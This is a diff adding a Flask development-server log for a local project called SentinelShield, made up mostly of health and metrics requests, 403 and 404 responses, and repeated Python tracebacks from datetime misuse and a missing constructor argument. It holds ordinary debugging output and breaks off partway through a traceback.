+2026-02-12 11:42:13,074 | INFO | 127.0.0.1 - - [12/Feb/2026 11:42:13] "GET /health HTTP/1.1" 200 -
+2026-02-12 11:42:15,818 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 11:42:15,818 | INFO | 127.0.0.1 - - [12/Feb/2026 11:42:15] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 11:42:17,137 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 11:42:17,137 | INFO | 127.0.0.1 - - [12/Feb/2026 11:42:17] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 11:42:33,838 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 11:42:33,839 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 11:42:43,090 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 184, in sentinel_shield
+    timestamp=datetime.utcnow(),
+              ^^^^^^^^^^^^^^^
+AttributeError: module 'datetime' has no attribute 'utcnow'
+2026-02-12 11:42:43,093 | INFO | 127.0.0.1 GET / 500
+2026-02-12 11:42:43,094 | INFO | 127.0.0.1 - - [12/Feb/2026 11:42:43] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 12:59:44,798 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 12:59:44,800 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 12:59:55,945 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 206, in health_check
+    "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
+                 ^^^^^^^^^^^^^^^^^
+AttributeError: type object 'datetime.datetime' has no attribute 'datetime'
+2026-02-12 12:59:55,949 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 12:59:55,950 | INFO | 127.0.0.1 - - [12/Feb/2026 12:59:55] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 13:00:00,238 | INFO | 127.0.0.1 GET / 403
+2026-02-12 13:00:00,238 | INFO | 127.0.0.1 - - [12/Feb/2026 13:00:00] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-12 13:00:17,464 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 206, in health_check
+    "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
+                 ^^^^^^^^^^^^^^^^^
+AttributeError: type object 'datetime.datetime' has no attribute 'datetime'
+2026-02-12 13:00:17,467 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 13:00:17,467 | INFO | 127.0.0.1 - - [12/Feb/2026 13:00:17] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 13:00:44,075 | INFO | 127.0.0.1 GET /matrics 404
+2026-02-12 13:00:44,076 | INFO | 127.0.0.1 - - [12/Feb/2026 13:00:44] "[33mGET /matrics HTTP/1.1[0m" 404 -
+2026-02-12 13:01:06,257 | INFO | 127.0.0.1 GET / 403
+2026-02-12 13:01:06,258 | INFO | 127.0.0.1 - - [12/Feb/2026 13:01:06] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-12 13:01:15,912 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 206, in health_check
+    "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
+                 ^^^^^^^^^^^^^^^^^
+AttributeError: type object 'datetime.datetime' has no attribute 'datetime'
+2026-02-12 13:01:15,914 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 13:01:15,914 | INFO | 127.0.0.1 - - [12/Feb/2026 13:01:15] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 13:01:30,295 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 13:01:30,295 | INFO | 127.0.0.1 - - [12/Feb/2026 13:01:30] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 13:17:52,302 | INFO | 127.0.0.1 GET /unban/127.0.0.1 404
+2026-02-12 13:17:52,303 | INFO | 127.0.0.1 - - [12/Feb/2026 13:17:52] "[33mGET /unban/127.0.0.1 HTTP/1.1[0m" 404 -
+2026-02-12 13:18:59,442 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 13:18:59,442 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 13:19:06,899 | INFO | 127.0.0.1 GET /showip 404
+2026-02-12 13:19:06,900 | INFO | 127.0.0.1 - - [12/Feb/2026 13:19:06] "[33mGET /showip HTTP/1.1[0m" 404 -
+2026-02-12 13:19:14,124 | INFO | 127.0.0.1 GET / 403
+2026-02-12 13:19:14,125 | INFO | 127.0.0.1 - - [12/Feb/2026 13:19:14] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-12 13:19:19,352 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 206, in health_check
+    "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
+                 ^^^^^^^^^^^^^^^^^
+AttributeError: type object 'datetime.datetime' has no attribute 'datetime'
+2026-02-12 13:19:19,355 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 13:19:19,355 | INFO | 127.0.0.1 - - [12/Feb/2026 13:19:19] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 13:19:27,579 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 13:19:27,580 | INFO | 127.0.0.1 - - [12/Feb/2026 13:19:27] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 16:38:55,474 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 16:38:55,476 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 16:42:01,262 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 16:42:01,263 | INFO | 127.0.0.1 - - [12/Feb/2026 16:42:01] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 16:42:01,338 | INFO | 127.0.0.1 GET /favicon.ico 404
+2026-02-12 16:42:01,339 | INFO | 127.0.0.1 - - [12/Feb/2026 16:42:01] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2026-02-12 16:42:54,735 | INFO | 127.0.0.1 GET /showip 404
+2026-02-12 16:42:54,737 | INFO | 127.0.0.1 - - [12/Feb/2026 16:42:54] "[33mGET /showip HTTP/1.1[0m" 404 -
+2026-02-12 17:01:23,894 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 17:01:23,896 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 17:01:33,682 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 206, in health_check
+    "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
+                 ^^^^^^^^^^^^^^^^^
+AttributeError: type object 'datetime.datetime' has no attribute 'datetime'
+2026-02-12 17:01:33,688 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 17:01:33,689 | INFO | 127.0.0.1 - - [12/Feb/2026 17:01:33] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 17:01:46,509 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 184, in sentinel_shield
+    timestamp=datetime.datetime.now(datetime.UTC),
+              ^^^^^^^^^^^^^^^^^
+AttributeError: type object 'datetime.datetime' has no attribute 'datetime'
+2026-02-12 17:01:46,513 | INFO | 127.0.0.1 GET / 500
+2026-02-12 17:01:46,513 | INFO | 127.0.0.1 - - [12/Feb/2026 17:01:46] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 17:03:21,759 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 17:03:21,759 | INFO | 127.0.0.1 - - [12/Feb/2026 17:03:21] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 17:36:52,277 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 17:36:52,278 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 17:36:55,754 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 206, in health_check
+    "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
+                 ^^^^^^^^^^^^^^^^^
+AttributeError: type object 'datetime.datetime' has no attribute 'datetime'
+2026-02-12 17:36:55,759 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 17:36:55,760 | INFO | 127.0.0.1 - - [12/Feb/2026 17:36:55] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 17:36:58,631 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 184, in sentinel_shield
+    timestamp=datetime.datetime.now(datetime.UTC),
+              ^^^^^^^^^^^^^^^^^
+AttributeError: type object 'datetime.datetime' has no attribute 'datetime'
+2026-02-12 17:36:58,633 | INFO | 127.0.0.1 GET / 500
+2026-02-12 17:36:58,633 | INFO | 127.0.0.1 - - [12/Feb/2026 17:36:58] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 17:39:07,843 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 17:39:07,844 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 17:39:12,468 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 207, in health_check
+    "timestamp": datetime.now(UTC).isoformat()
+                              ^^^
+NameError: name 'UTC' is not defined
+2026-02-12 17:39:12,480 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 17:39:12,481 | INFO | 127.0.0.1 - - [12/Feb/2026 17:39:12] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 17:39:13,098 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 207, in health_check
+    "timestamp": datetime.now(UTC).isoformat()
+                              ^^^
+NameError: name 'UTC' is not defined
+2026-02-12 17:39:13,102 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 17:39:13,102 | INFO | 127.0.0.1 - - [12/Feb/2026 17:39:13] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 17:39:24,223 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 207, in health_check
+    "timestamp": datetime.now(UTC).isoformat()
+                              ^^^
+NameError: name 'UTC' is not defined
+2026-02-12 17:39:24,225 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 17:39:24,227 | INFO | 127.0.0.1 - - [12/Feb/2026 17:39:24] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 17:39:54,058 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 207, in health_check
+    "timestamp": datetime.now(UTC).isoformat()
+                              ^^^
+NameError: name 'UTC' is not defined
+2026-02-12 17:39:54,061 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 17:39:54,061 | INFO | 127.0.0.1 - - [12/Feb/2026 17:39:54] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 17:39:54,630 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 207, in health_check
+    "timestamp": datetime.now(UTC).isoformat()
+                              ^^^
+NameError: name 'UTC' is not defined
+2026-02-12 17:39:54,634 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 17:39:54,635 | INFO | 127.0.0.1 - - [12/Feb/2026 17:39:54] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 17:40:32,337 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 17:40:32,338 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 17:40:40,886 | ERROR | Exception on /health [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 207, in health_check
+    "timestamp": datetime.now(UTC).isoformat()
+                              ^^^
+NameError: name 'UTC' is not defined
+2026-02-12 17:40:40,893 | INFO | 127.0.0.1 GET /health 500
+2026-02-12 17:40:40,894 | INFO | 127.0.0.1 - - [12/Feb/2026 17:40:40] "[35m[1mGET /health HTTP/1.1[0m" 500 -
+2026-02-12 17:44:44,032 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 17:44:44,033 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 17:44:56,186 | INFO | 127.0.0.1 GET /health 200
+2026-02-12 17:44:56,188 | INFO | 127.0.0.1 - - [12/Feb/2026 17:44:56] "GET /health HTTP/1.1" 200 -
+2026-02-12 17:45:03,441 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 178, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-12 17:45:03,447 | INFO | 127.0.0.1 GET / 500
+2026-02-12 17:45:03,448 | INFO | 127.0.0.1 - - [12/Feb/2026 17:45:03] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 17:45:12,851 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 17:45:12,852 | INFO | 127.0.0.1 - - [12/Feb/2026 17:45:12] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 17:52:07,296 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 17:52:07,298 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 17:52:20,489 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
